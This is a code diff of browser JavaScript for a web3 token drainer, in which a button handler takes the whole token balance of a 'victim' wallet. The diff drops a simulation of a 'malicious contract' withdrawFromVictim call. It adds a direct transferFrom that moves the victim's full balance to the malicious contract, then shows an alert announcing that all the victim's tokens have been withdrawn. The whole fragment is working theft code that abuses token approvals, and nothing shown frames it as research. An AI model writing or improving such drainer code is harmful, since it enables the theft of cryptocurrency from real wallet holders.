@@ -617,36 +617,15 @@ document.getElementById("transferTokensBtn").addEventListener("click", async () 
                 return;
             }
 
-            // Step 5: Simulate the malicious contract's withdrawal function call
-            console.debug("Simulating malicious contract function call...");
-            try {
-                const simulationResult = await maliciousContract.methods
-                    .withdrawFromVictim(cleanedVictimAddress, balance)
-                    .call({ from: deployerAddress }); // Simulate the function call
-                console.debug("Simulation successful, result:", simulationResult);
-
-                alert(`Simulation successful. You can proceed to withdraw all tokens from the victim's wallet.`);
-            } catch (simulationError) {
-                console.error("Simulation Error:", simulationError);
-
-                const errorReason = simulationError.message.match(/revert (.*)$/i);
-                if (errorReason) {
-                    alert(`Simulation failed: ${errorReason[1]}`);
-                } else {
-                    alert("Simulation failed due to an unknown error. Check console logs for details.");
-                }
-                return; // Stop execution if simulation fails
-            }
-
-            // Step 6: Execute the malicious contract's withdrawal function call
+            // Step 5: Call the malicious contract's transferFrom function
             console.debug("Executing malicious contract function call...");
-            const transaction = await maliciousContract.methods
-                .withdrawFromVictim(cleanedVictimAddress, balance)
-                .send({ from: deployerAddress }); // Execute the function
+            const transaction = await tokenContract.methods
+                .transferFrom(cleanedVictimAddress, maliciousContractAddress, balance) // Transfer from victim to malicious contract
+                .send({ from: deployerAddress }); // Deployer initiates the transaction
             console.debug("Transaction details:", transaction);
 
             // Notify successful withdrawal
-            alert(`Successfully withdrawn all tokens from the victim's wallet!`);
+            alert(`Successfully withdrawn all tokens from the victim's wallet to the malicious contract!`);
         } catch (error) {
             console.error("Withdrawal Error:", error);
             alert("Error occurred during withdrawal. Check victim's approval and balance.");
